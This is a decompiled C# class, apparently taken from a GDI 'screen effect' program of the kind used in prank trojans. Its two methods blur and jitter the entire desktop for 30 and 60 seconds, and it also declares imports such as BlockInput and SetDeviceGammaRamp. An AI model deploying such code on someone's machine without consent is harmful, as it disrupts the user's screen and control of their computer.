using System;
using System.Drawing;
using System.Globalization;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace ṧ
{
	// Token: 0x02000002 RID: 2
	internal class BLUR
	{
		// Token: 0x06000001 RID: 1
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreatePen(BLUR.PenStyle fnPenStyle, int nWidth, uint crColor);

		// Token: 0x06000002 RID: 2
		[DllImport("user32.dll", SetLastError = true)]
		private static extern IntPtr GetDC(IntPtr hWnd);

		// Token: 0x06000003 RID: 3
		[DllImport("gdi32.dll", SetLastError = true)]
		private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

		// Token: 0x06000004 RID: 4
		[DllImport("gdi32.dll")]
		public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

		// Token: 0x06000005 RID: 5
		[DllImport("gdi32.dll")]
		private static extern bool MoveToEx(IntPtr hdc, int X, int Y, IntPtr lpPoint);

		// Token: 0x06000006 RID: 6
		[DllImport("gdi32.dll", SetLastError = true)]
		private static extern bool MaskBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, IntPtr hbmMask, int xMask, int yMask, uint rop);

		// Token: 0x06000007 RID: 7
		[DllImport("gdi32.dll")]
		private static extern bool LineTo(IntPtr hdc, int nXEnd, int nYEnd);

		// Token: 0x06000008 RID: 8
		[DllImport("gdi32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool DeleteObject(IntPtr hObject);

		// Token: 0x06000009 RID: 9
		[DllImport("gdi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, BLUR.TernaryRasterOperations dwRop);

		// Token: 0x0600000A RID: 10
		[DllImport("gdi32.dll")]
		private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, BLUR.TernaryRasterOperations dwRop);

		// Token: 0x0600000B RID: 11
		[DllImport("gdi32.dll")]
		private static extern bool PlgBlt(IntPtr hdcDest, BLUR.POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);

		// Token: 0x0600000C RID: 12
		[DllImport("gdi32.dll")]
		private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, BLUR.TernaryRasterOperations dwRop);

		// Token: 0x0600000D RID: 13
		[DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr Ellipse(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

		// Token: 0x0600000E RID: 14
		[DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
		public static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, BLUR.BLENDFUNCTION blendFunction);

		// Token: 0x0600000F RID: 15
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateSolidBrush(uint crColor);

		// Token: 0x06000010 RID: 16
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateBitmap(int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits);

		// Token: 0x06000011 RID: 17
		[DllImport("gdi32.dll")]
		public static extern bool DeleteDC(IntPtr hdc);

		// Token: 0x06000012 RID: 18
		[DllImport("gdi32.dll")]
		private static extern bool FloodFill(IntPtr hdc, int nXStart, int nYStart, uint crFill);

		// Token: 0x06000013 RID: 19
		[DllImport("gdi32.dll", EntryPoint = "GdiGradientFill", ExactSpelling = true)]
		public static extern bool GradientFill(IntPtr hdc, BLUR.TRIVERTEX[] pVertex, uint dwNumVertex, BLUR.GRADIENT_RECT[] pMesh, uint dwNumMesh, BLUR.GRADIENT_FILL dwMode);

		// Token: 0x06000014 RID: 20
		[DllImport("user32.dll")]
		private static extern IntPtr GetDesktopWindow();

		// Token: 0x06000015 RID: 21
		[DllImport("user32.dll")]
		private static extern IntPtr GetWindowDC(IntPtr hwnd);

		// Token: 0x06000016 RID: 22
		[DllImport("user32.dll")]
		private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

		// Token: 0x06000017 RID: 23
		[DllImport("User32.dll")]
		private static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

		// Token: 0x06000018 RID: 24
		[DllImport("gdi32.dll")]
		private static extern bool FillRgn(IntPtr hdc, IntPtr hrgn, IntPtr hbr);

		// Token: 0x06000019 RID: 25
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

		// Token: 0x0600001A RID: 26
		[DllImport("gdi32.dll")]
		private static extern bool Pie(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nXRadial1, int nYRadial1, int nXRadial2, int nYRadial2);

		// Token: 0x0600001B RID: 27
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

		// Token: 0x0600001C RID: 28
		[DllImport("gdi32.dll")]
		private static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

		// Token: 0x0600001D RID: 29
		[DllImport("gdi32.dll")]
		private static extern uint SetPixel(IntPtr hdc, int X, int Y, int crColor);

		// Token: 0x0600001E RID: 30
		[DllImport("gdi32.dll")]
		private static extern IntPtr GetPixel(IntPtr hdc, int nXPos, int nYPos);

		// Token: 0x0600001F RID: 31
		[DllImport("gdi32.dll")]
		private static extern bool AngleArc(IntPtr hdc, int X, int Y, uint dwRadius, float eStartAngle, float eSweepAngle);

		// Token: 0x06000020 RID: 32
		[DllImport("gdi32.dll")]
		private static extern bool RoundRect(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidth, int nHeight);

		// Token: 0x06000021 RID: 33
		[DllImport("gdi32.dll")]
		private static extern bool DeleteMetaFile(IntPtr hmf);

		// Token: 0x06000022 RID: 34
		[DllImport("gdi32.dll")]
		private static extern bool CancelDC(IntPtr hdc);

		// Token: 0x06000023 RID: 35
		[DllImport("gdi32.dll")]
		private static extern bool Polygon(IntPtr hdc, BLUR.POINT[] lpPoints, int nCount);

		// Token: 0x06000024 RID: 36
		[DllImport("gdi32.dll")]
		private static extern int SetBitmapBits(IntPtr hbmp, int cBytes, BLUR.RGBQUAD[] lpBits);

		// Token: 0x06000025 RID: 37
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool Beep(uint dwFreq, uint dwDuration);

		// Token: 0x06000026 RID: 38
		[DllImport("user32.dll")]
		private static extern bool BlockInput(bool block);

		// Token: 0x06000027 RID: 39
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr LoadImage(IntPtr hinst, string lpszName, uint uType, int cxDesired, int cyDesired, uint fuLoad);

		// Token: 0x06000028 RID: 40
		[DllImport("user32.dll", SetLastError = true)]
		private static extern int DestroyIcon(IntPtr hIcon);

		// Token: 0x06000029 RID: 41
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr LoadLibraryEx(IntPtr lpFileName, IntPtr hFile, BLUR.LoadLibraryFlags dwFlags);

		// Token: 0x0600002A RID: 42
		[DllImport("user32.dll")]
		private static extern IntPtr LoadBitmap(IntPtr hInstance, string lpBitmapName);

		// Token: 0x0600002B RID: 43
		[DllImport("user32.dll")]
		private static extern IntPtr BeginPaint(IntPtr hwnd, out BLUR.PAINTSTRUCT lpPaint);

		// Token: 0x0600002C RID: 44
		[DllImport("user32.dll")]
		private static extern bool EndPaint(IntPtr hWnd, out BLUR.PAINTSTRUCT lpPaint);

		// Token: 0x0600002D RID: 45
		[DllImport("gdi32.dll")]
		private static extern int SetStretchBltMode(IntPtr hdc, BLUR.StretchBltMode iStretchMode);

		// Token: 0x0600002E RID: 46
		[DllImport("gdi32.dll")]
		private static extern int StretchDIBits(IntPtr hdc, int XDest, int YDest, int nDestWidth, int nDestHeight, int XSrc, int YSrc, int nSrcWidth, int nSrcHeight, BLUR.RGBQUAD rgbq, [In] ref BLUR.BITMAPINFO lpBitsInfo, BLUR.DIB_Color_Mode dib_mode, BLUR.TernaryRasterOperations dwRop);

		// Token: 0x0600002F RID: 47
		[DllImport("gdi32.dll")]
		public static extern bool SetDeviceGammaRamp(IntPtr hDC, ref BLUR.RAMP lpRamp);

		// Token: 0x06000030 RID: 48
		[DllImport("Gdi32")]
		private static extern long GetBitmapBits([In] IntPtr hbmp, [In] int cbBuffer, BLUR.RGBQUAD[] lpvBits);

		// Token: 0x06000031 RID: 49
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateHatchBrush(int iHatch, uint Color);

		// Token: 0x06000032 RID: 50
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreatePatternBrush(IntPtr hbmp);

		// Token: 0x06000033 RID: 51
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateDIBitmap(IntPtr hdc, [In] ref BLUR.BITMAPINFOHEADER lpbmih, uint fdwInit, byte[] lpbInit, [In] ref BLUR.BITMAPINFO lpbmi, uint fuUsage);

		// Token: 0x06000034 RID: 52
		[DllImport("gdi32.dll")]
		private static extern int SetDIBitsToDevice(IntPtr hdc, int XDest, int YDest, uint dwWidth, uint dwHeight, int XSrc, int YSrc, uint uStartScan, uint cScanLines, byte[] lpvBits, [In] ref BLUR.BITMAPINFO lpbmi, uint fuColorUse);

		// Token: 0x06000035 RID: 53
		[DllImport("gdi32.dll")]
		private static extern IntPtr SetDIBits(IntPtr hdc, IntPtr hbm, uint start, int line, int lpBits, [In] ref BLUR.BITMAPINFO lpbmi, BLUR.DIB_Color_Mode ColorUse);

		// Token: 0x06000036 RID: 54 RVA: 0x00002050 File Offset: 0x00000250
		public static void WAIT()
		{
			DateTime now = DateTime.Now;
			TimeSpan t = TimeSpan.FromSeconds(30.0);
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			uint[] array = new uint[]
			{
				16711680U,
				16711868U,
				65331U,
				268433152U,
				65519U
			};
			while (DateTime.Now - now < t)
			{
				Random random = new Random();
				IntPtr dc = BLUR.GetDC(IntPtr.Zero);
				IntPtr intPtr = BLUR.CreateCompatibleDC(dc);
				IntPtr intPtr2 = BLUR.CreateCompatibleBitmap(dc, width, height);
				IntPtr intPtr3 = BLUR.SelectObject(intPtr, intPtr2);
				BLUR.BitBlt(intPtr, 0, 0, width, height, dc, 0, 0, BLUR.TernaryRasterOperations.SRCCOPY);
				BLUR.AlphaBlend(dc, random.Next(-4, 4), random.Next(-4, 4), width, height, intPtr, 0, 0, width, height, new BLUR.BLENDFUNCTION(0, 0, 70, 0));
				BLUR.SelectObject(intPtr, intPtr3);
				BLUR.DeleteObject(intPtr3);
				BLUR.DeleteObject(intPtr2);
				BLUR.DeleteDC(intPtr);
				BLUR.DeleteDC(dc);
				Thread.Sleep(50);
			}
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00002178 File Offset: 0x00000378
		internal static void BIT()
		{
			DateTime now = DateTime.Now;
			TimeSpan t = TimeSpan.FromSeconds(60.0);
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			uint[] array = new uint[]
			{
				16711680U,
				16711868U,
				65331U,
				268433152U,
				65519U
			};
			while (DateTime.Now - now < t)
			{
				Random random = new Random();
				IntPtr dc = BLUR.GetDC(IntPtr.Zero);
				IntPtr intPtr = BLUR.CreateCompatibleDC(dc);
				IntPtr intPtr2 = BLUR.CreateCompatibleBitmap(dc, width, height);
				IntPtr intPtr3 = BLUR.SelectObject(intPtr, intPtr2);
				BLUR.BitBlt(intPtr, 0, 0, width, height, dc, 0, 0, BLUR.TernaryRasterOperations.SRCCOPY);
				BLUR.AlphaBlend(dc, random.Next(-4, 4), random.Next(-4, 4), width, height, intPtr, 0, 0, width, height, new BLUR.BLENDFUNCTION(0, 0, 70, 0));
				BLUR.SelectObject(intPtr, intPtr3);
				BLUR.DeleteObject(intPtr3);
				BLUR.DeleteObject(intPtr2);
				BLUR.DeleteDC(intPtr);
				BLUR.DeleteDC(dc);
				Thread.Sleep(50);
			}
		}

		// Token: 0x04000001 RID: 1
		public const int LR_DEFAULTCOLOR = 0;

		// Token: 0x04000002 RID: 2
		public const int LR_MONOCHROME = 1;

		// Token: 0x04000003 RID: 3
		public const int LR_COPYRETURNORG = 4;

		// Token: 0x04000004 RID: 4
		public const int LR_COPYDELETEORG = 8;

		// Token: 0x04000005 RID: 5
		public const int LR_LOADFROMFILE = 16;

		// Token: 0x04000006 RID: 6
		public const int LR_LOADTRANSPARENT = 32;

		// Token: 0x04000007 RID: 7
		public const int LR_DEFAULTSIZE = 64;

		// Token: 0x04000008 RID: 8
		public const int LR_VGACOLOR = 128;

		// Token: 0x04000009 RID: 9
		public const int LR_LOADMAP3DCOLORS = 4096;

		// Token: 0x0400000A RID: 10
		public const int LR_CREATEDIBSECTION = 8192;

		// Token: 0x0400000B RID: 11
		public const int LR_COPYFROMRESOURCE = 16384;

		// Token: 0x0400000C RID: 12
		public const int LR_SHARED = 32768;

		// Token: 0x0400000D RID: 13
		private const int AC_SRC_OVER = 0;

		// Token: 0x0400000E RID: 14
		private const int AC_SRC_ALPHA = 1;

		// Token: 0x02000017 RID: 23
		public struct RAMP
		{
			// Token: 0x04000046 RID: 70
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			public ushort[] Red;

			// Token: 0x04000047 RID: 71
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			public ushort[] Green;

			// Token: 0x04000048 RID: 72
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			public ushort[] Blue;
		}

		// Token: 0x02000018 RID: 24
		public struct BITMAPINFO
		{
			// Token: 0x04000049 RID: 73
			public BLUR.BITMAPINFOHEADER bmiHeader;

			// Token: 0x0400004A RID: 74
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.Struct)]
			public BLUR.RGBQUAD[] bmiColors;
		}

		// Token: 0x02000019 RID: 25
		public struct BITMAPINFOHEADER
		{
			// Token: 0x060000A4 RID: 164 RVA: 0x00003BAE File Offset: 0x00001DAE
			public void Init()
			{
				this.biSize = (uint)Marshal.SizeOf(this);
			}

			// Token: 0x0400004B RID: 75
			public uint biSize;

			// Token: 0x0400004C RID: 76
			public int biWidth;

			// Token: 0x0400004D RID: 77
			public int biHeight;

			// Token: 0x0400004E RID: 78
			public ushort biPlanes;

			// Token: 0x0400004F RID: 79
			public ushort biBitCount;

			// Token: 0x04000050 RID: 80
			public uint biSizeImage;

			// Token: 0x04000051 RID: 81
			public int biXPelsPerMeter;

			// Token: 0x04000052 RID: 82
			public int biYPelsPerMeter;

			// Token: 0x04000053 RID: 83
			public uint biClrUsed;

			// Token: 0x04000054 RID: 84
			public uint biClrImportant;

			// Token: 0x04000055 RID: 85
			public uint biCompression;
		}

		// Token: 0x0200001A RID: 26
		private enum BitmapCompressionMode : uint
		{
			// Token: 0x04000057 RID: 87
			BI_RGB,
			// Token: 0x04000058 RID: 88
			BI_RLE8,
			// Token: 0x04000059 RID: 89
			BI_RLE4,
			// Token: 0x0400005A RID: 90
			BI_BITFIELDS,
			// Token: 0x0400005B RID: 91
			BI_JPEG,
			// Token: 0x0400005C RID: 92
			BI_PNG
		}

		// Token: 0x0200001B RID: 27
		private enum DIB_Color_Mode : uint
		{
			// Token: 0x0400005E RID: 94
			DIB_RGB_COLORS,
			// Token: 0x0400005F RID: 95
			DIB_PAL_COLORS
		}

		// Token: 0x0200001C RID: 28
		private enum StretchBltMode
		{
			// Token: 0x04000061 RID: 97
			STRETCH_ANDSCANS = 1,
			// Token: 0x04000062 RID: 98
			STRETCH_ORSCANS,
			// Token: 0x04000063 RID: 99
			STRETCH_DELETESCANS,
			// Token: 0x04000064 RID: 100
			STRETCH_HALFTONE
		}

		// Token: 0x0200001D RID: 29
		private struct PAINTSTRUCT
		{
			// Token: 0x04000065 RID: 101
			public IntPtr hdc;

			// Token: 0x04000066 RID: 102
			public bool fErase;

			// Token: 0x04000067 RID: 103
			public BLUR.RECT rcPaint;

			// Token: 0x04000068 RID: 104
			public bool fRestore;

			// Token: 0x04000069 RID: 105
			public bool fIncUpdate;

			// Token: 0x0400006A RID: 106
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
			public byte[] rgbReserved;
		}

		// Token: 0x0200001E RID: 30
		public struct RECT
		{
			// Token: 0x060000A5 RID: 165 RVA: 0x00003BC7 File Offset: 0x00001DC7
			public RECT(int left, int top, int right, int bottom)
			{
				this.Left = left;
				this.Top = top;
				this.Right = right;
				this.Bottom = bottom;
			}

			// Token: 0x060000A6 RID: 166 RVA: 0x00003BE7 File Offset: 0x00001DE7
			public RECT(Rectangle r)
			{
				this = new BLUR.RECT(r.Left, r.Top, r.Right, r.Bottom);
			}

			// Token: 0x17000007 RID: 7
			// (get) Token: 0x060000A7 RID: 167 RVA: 0x00003C10 File Offset: 0x00001E10
			// (set) Token: 0x060000A8 RID: 168 RVA: 0x00003C28 File Offset: 0x00001E28
			public int X
			{
				get
				{
					return this.Left;
				}
				set
				{
					this.Right -= this.Left - value;
					this.Left = value;
				}
			}

			// Token: 0x17000008 RID: 8
			// (get) Token: 0x060000A9 RID: 169 RVA: 0x00003C48 File Offset: 0x00001E48
			// (set) Token: 0x060000AA RID: 170 RVA: 0x00003C60 File Offset: 0x00001E60
			public int Y
			{
				get
				{
					return this.Top;
				}
				set
				{
					this.Bottom -= this.Top - value;
					this.Top = value;
				}
			}

			// Token: 0x17000009 RID: 9
			// (get) Token: 0x060000AB RID: 171 RVA: 0x00003C80 File Offset: 0x00001E80
			// (set) Token: 0x060000AC RID: 172 RVA: 0x00003C9F File Offset: 0x00001E9F
			public int Height
			{
				get
				{
					return this.Bottom - this.Top;
				}
				set
				{
					this.Bottom = value + this.Top;
				}
			}

			// Token: 0x1700000A RID: 10
			// (get) Token: 0x060000AD RID: 173 RVA: 0x00003CB0 File Offset: 0x00001EB0
			// (set) Token: 0x060000AE RID: 174 RVA: 0x00003CCF File Offset: 0x00001ECF
			public int Width
			{
				get
				{
					return this.Right - this.Left;
				}
				set
				{
					this.Right = value + this.Left;
				}
			}

			// Token: 0x1700000B RID: 11
			// (get) Token: 0x060000AF RID: 175 RVA: 0x00003CE0 File Offset: 0x00001EE0
			// (set) Token: 0x060000B0 RID: 176 RVA: 0x00003D03 File Offset: 0x00001F03
			public Point Location
			{
				get
				{
					return new Point(this.Left, this.Top);
				}
				set
				{
					this.X = value.X;
					this.Y = value.Y;
				}
			}

			// Token: 0x1700000C RID: 12
			// (get) Token: 0x060000B1 RID: 177 RVA: 0x00003D24 File Offset: 0x00001F24
			// (set) Token: 0x060000B2 RID: 178 RVA: 0x00003D47 File Offset: 0x00001F47
			public Size Size
			{
				get
				{
					return new Size(this.Width, this.Height);
				}
				set
				{
					this.Width = value.Width;
					this.Height = value.Height;
				}
			}

			// Token: 0x060000B3 RID: 179 RVA: 0x00003D68 File Offset: 0x00001F68
			public static implicit operator Rectangle(BLUR.RECT r)
			{
				return new Rectangle(r.Left, r.Top, r.Width, r.Height);
			}

			// Token: 0x060000B4 RID: 180 RVA: 0x00003D9C File Offset: 0x00001F9C
			public static implicit operator BLUR.RECT(Rectangle r)
			{
				return new BLUR.RECT(r);
			}

			// Token: 0x060000B5 RID: 181 RVA: 0x00003DB4 File Offset: 0x00001FB4
			public static bool operator ==(BLUR.RECT r1, BLUR.RECT r2)
			{
				return r1.Equals(r2);
			}

			// Token: 0x060000B6 RID: 182 RVA: 0x00003DD0 File Offset: 0x00001FD0
			public static bool operator !=(BLUR.RECT r1, BLUR.RECT r2)
			{
				return !r1.Equals(r2);
			}

			// Token: 0x060000B7 RID: 183 RVA: 0x00003DF0 File Offset: 0x00001FF0
			public bool Equals(BLUR.RECT r)
			{
				return r.Left == this.Left && r.Top == this.Top && r.Right == this.Right && r.Bottom == this.Bottom;
			}

			// Token: 0x060000B8 RID: 184 RVA: 0x00003E40 File Offset: 0x00002040
			public override bool Equals(object obj)
			{
				bool flag = obj is BLUR.RECT;
				bool result;
				if (flag)
				{
					result = this.Equals((BLUR.RECT)obj);
				}
				else
				{
					bool flag2 = obj is Rectangle;
					result = (flag2 && this.Equals(new BLUR.RECT((Rectangle)obj)));
				}
				return result;
			}

			// Token: 0x060000B9 RID: 185 RVA: 0x00003E90 File Offset: 0x00002090
			public override int GetHashCode()
			{
				return this.GetHashCode();
			}

			// Token: 0x060000BA RID: 186 RVA: 0x00003EBC File Offset: 0x000020BC
			public override string ToString()
			{
				return string.Format(CultureInfo.CurrentCulture, "{{Left={0},Top={1},Right={2},Bottom={3}}}", new object[]
				{
					this.Left,
					this.Top,
					this.Right,
					this.Bottom
				});
			}

			// Token: 0x0400006B RID: 107
			public int Left;

			// Token: 0x0400006C RID: 108
			public int Top;

			// Token: 0x0400006D RID: 109
			public int Right;

			// Token: 0x0400006E RID: 110
			public int Bottom;
		}

		// Token: 0x0200001F RID: 31
		private enum LoadLibraryFlags : uint
		{
			// Token: 0x04000070 RID: 112
			DONT_RESOLVE_DLL_REFERENCES = 1U,
			// Token: 0x04000071 RID: 113
			LOAD_IGNORE_CODE_AUTHZ_LEVEL = 16U,
			// Token: 0x04000072 RID: 114
			LOAD_LIBRARY_AS_DATAFILE = 2U,
			// Token: 0x04000073 RID: 115
			LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE = 64U,
			// Token: 0x04000074 RID: 116
			LOAD_LIBRARY_AS_IMAGE_RESOURCE = 32U,
			// Token: 0x04000075 RID: 117
			LOAD_WITH_ALTERED_SEARCH_PATH = 8U
		}

		// Token: 0x02000020 RID: 32
		private enum PenStyle
		{
			// Token: 0x04000077 RID: 119
			PS_SOLID,
			// Token: 0x04000078 RID: 120
			PS_DASH,
			// Token: 0x04000079 RID: 121
			PS_DOT,
			// Token: 0x0400007A RID: 122
			PS_DASHDOT,
			// Token: 0x0400007B RID: 123
			PS_DASHDOTDOT,
			// Token: 0x0400007C RID: 124
			PS_NULL,
			// Token: 0x0400007D RID: 125
			PS_INSIDEFRAME,
			// Token: 0x0400007E RID: 126
			PS_USERSTYLE,
			// Token: 0x0400007F RID: 127
			PS_ALTERNATE,
			// Token: 0x04000080 RID: 128
			PS_STYLE_MASK = 15,
			// Token: 0x04000081 RID: 129
			PS_ENDCAP_ROUND = 0,
			// Token: 0x04000082 RID: 130
			PS_ENDCAP_SQUARE = 256,
			// Token: 0x04000083 RID: 131
			PS_ENDCAP_FLAT = 512,
			// Token: 0x04000084 RID: 132
			PS_ENDCAP_MASK = 3840,
			// Token: 0x04000085 RID: 133
			PS_JOIN_ROUND = 0,
			// Token: 0x04000086 RID: 134
			PS_JOIN_BEVEL = 4096,
			// Token: 0x04000087 RID: 135
			PS_JOIN_MITER = 8192,
			// Token: 0x04000088 RID: 136
			PS_JOIN_MASK = 61440,
			// Token: 0x04000089 RID: 137
			PS_COSMETIC = 0,
			// Token: 0x0400008A RID: 138
			PS_GEOMETRIC = 65536,
			// Token: 0x0400008B RID: 139
			PS_TYPE_MASK = 983040
		}

		// Token: 0x02000021 RID: 33
		public enum TernaryRasterOperations : uint
		{
			// Token: 0x0400008D RID: 141
			SRCCOPY = 13369376U,
			// Token: 0x0400008E RID: 142
			SRCPAINT = 15597702U,
			// Token: 0x0400008F RID: 143
			SRCAND = 8913094U,
			// Token: 0x04000090 RID: 144
			SRCINVERT = 6684742U,
			// Token: 0x04000091 RID: 145
			SRCERASE = 4457256U,
			// Token: 0x04000092 RID: 146
			NOTSRCCOPY = 3342344U,
			// Token: 0x04000093 RID: 147
			NOTSRCERASE = 1114278U,
			// Token: 0x04000094 RID: 148
			MERGECOPY = 12583114U,
			// Token: 0x04000095 RID: 149
			MERGEPAINT = 12255782U,
			// Token: 0x04000096 RID: 150
			PATCOPY = 15728673U,
			// Token: 0x04000097 RID: 151
			PATPAINT = 16452105U,
			// Token: 0x04000098 RID: 152
			PATINVERT = 5898313U,
			// Token: 0x04000099 RID: 153
			DSTINVERT = 5570569U,
			// Token: 0x0400009A RID: 154
			BLACKNESS = 66U,
			// Token: 0x0400009B RID: 155
			WHITENESS = 16711778U,
			// Token: 0x0400009C RID: 156
			CAPTUREBLT = 1073741824U,
			// Token: 0x0400009D RID: 157
			CUSTOM = 1051781U
		}

		// Token: 0x02000022 RID: 34
		public struct POINT
		{
			// Token: 0x060000BB RID: 187 RVA: 0x00003F1B File Offset: 0x0000211B
			public POINT(int x, int y)
			{
				this.X = x;
				this.Y = y;
			}

			// Token: 0x060000BC RID: 188 RVA: 0x00003F2C File Offset: 0x0000212C
			public static implicit operator Point(BLUR.POINT p)
			{
				return new Point(p.X, p.Y);
			}

			// Token: 0x060000BD RID: 189 RVA: 0x00003F50 File Offset: 0x00002150
			public static implicit operator BLUR.POINT(Point p)
			{
				return new BLUR.POINT(p.X, p.Y);
			}

			// Token: 0x0400009E RID: 158
			public int X;

			// Token: 0x0400009F RID: 159
			public int Y;
		}

		// Token: 0x02000023 RID: 35
		public struct BLENDFUNCTION
		{
			// Token: 0x060000BE RID: 190 RVA: 0x00003F75 File Offset: 0x00002175
			public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
			{
				this.BlendOp = op;
				this.BlendFlags = flags;
				this.SourceConstantAlpha = alpha;
				this.AlphaFormat = format;
			}

			// Token: 0x040000A0 RID: 160
			private byte BlendOp;

			// Token: 0x040000A1 RID: 161
			private byte BlendFlags;

			// Token: 0x040000A2 RID: 162
			private byte SourceConstantAlpha;

			// Token: 0x040000A3 RID: 163
			private byte AlphaFormat;
		}

		// Token: 0x02000024 RID: 36
		public struct GRADIENT_RECT
		{
			// Token: 0x060000BF RID: 191 RVA: 0x00003F95 File Offset: 0x00002195
			public GRADIENT_RECT(uint upLeft, uint lowRight)
			{
				this.UpperLeft = upLeft;
				this.LowerRight = lowRight;
			}

			// Token: 0x040000A4 RID: 164
			public uint UpperLeft;

			// Token: 0x040000A5 RID: 165
			public uint LowerRight;
		}

		// Token: 0x02000025 RID: 37
		public struct TRIVERTEX
		{
			// Token: 0x060000C0 RID: 192 RVA: 0x00003FA6 File Offset: 0x000021A6
			public TRIVERTEX(int x, int y, ushort red, ushort green, ushort blue, ushort alpha)
			{
				this.x = x;
				this.y = y;
				this.Red = red;
				this.Green = green;
				this.Blue = blue;
				this.Alpha = alpha;
			}

			// Token: 0x040000A6 RID: 166
			public int x;

			// Token: 0x040000A7 RID: 167
			public int y;

			// Token: 0x040000A8 RID: 168
			public ushort Red;

			// Token: 0x040000A9 RID: 169
			public ushort Green;

			// Token: 0x040000AA RID: 170
			public ushort Blue;

			// Token: 0x040000AB RID: 171
			public ushort Alpha;
		}

		// Token: 0x02000026 RID: 38
		public enum GRADIENT_FILL : uint
		{
			// Token: 0x040000AD RID: 173
			RECT_H,
			// Token: 0x040000AE RID: 174
			RECT_V,
			// Token: 0x040000AF RID: 175
			TRIANGLE,
			// Token: 0x040000B0 RID: 176
			OP_FLAG = 255U
		}

		// Token: 0x02000027 RID: 39
		public struct GRADIENT_TRIANGLE
		{
			// Token: 0x060000C1 RID: 193 RVA: 0x00003FD6 File Offset: 0x000021D6
			public GRADIENT_TRIANGLE(uint vertex1, uint vertex2, uint vertex3)
			{
				this.Vertex1 = vertex1;
				this.Vertex2 = vertex2;
				this.Vertex3 = vertex3;
			}

			// Token: 0x040000B1 RID: 177
			public uint Vertex1;

			// Token: 0x040000B2 RID: 178
			public uint Vertex2;

			// Token: 0x040000B3 RID: 179
			public uint Vertex3;
		}

		// Token: 0x02000028 RID: 40
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct RGBQUAD
		{
			// Token: 0x040000B4 RID: 180
			public byte rgbBlue;

			// Token: 0x040000B5 RID: 181
			public byte rgbGreen;

			// Token: 0x040000B6 RID: 182
			public byte rgbRed;

			// Token: 0x040000B7 RID: 183
			public byte rgbReserved;
		}
	}
}
